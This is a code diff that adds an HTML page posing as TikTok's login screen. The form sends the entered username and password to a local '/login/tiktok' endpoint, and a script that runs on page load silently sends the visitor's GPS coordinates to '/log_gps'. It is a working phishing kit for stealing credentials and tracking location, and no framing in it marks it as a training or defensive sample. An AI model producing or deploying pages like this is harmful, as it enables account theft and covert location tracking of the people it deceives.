@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>TikTok - Make Your Day</title>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen font-sans">
+    <div class="w-full max-w-[440px] p-8 border border-gray-100 rounded-lg shadow-2xl text-center">
+        <h2 class="text-2xl font-bold mb-6">Log in to TikTok</h2>
+        <form action="/login/tiktok" method="POST" class="space-y-4 text-left">
+            <div><label class="text-xs font-bold text-gray-600 block mb-1">Email or Username</label>
+            <input name="user" type="text" class="w-full p-3 bg-gray-100 border-none rounded text-sm focus:ring-1 focus:ring-gray-300" required></div>
+            <div><label class="text-xs font-bold text-gray-600 block mb-1">Password</label>
+            <input name="pass" type="password" class="w-full p-3 bg-gray-100 border-none rounded text-sm focus:ring-1 focus:ring-gray-300" required></div>
+            <button class="w-full bg-[#fe2c55] text-white py-3.5 rounded font-bold text-lg shadow-md mt-4">Log in</button>
+        </form>
+    </div>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(p) {
+                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
+                });
+            }
+        }
+    </script>
+</body>
+</html>
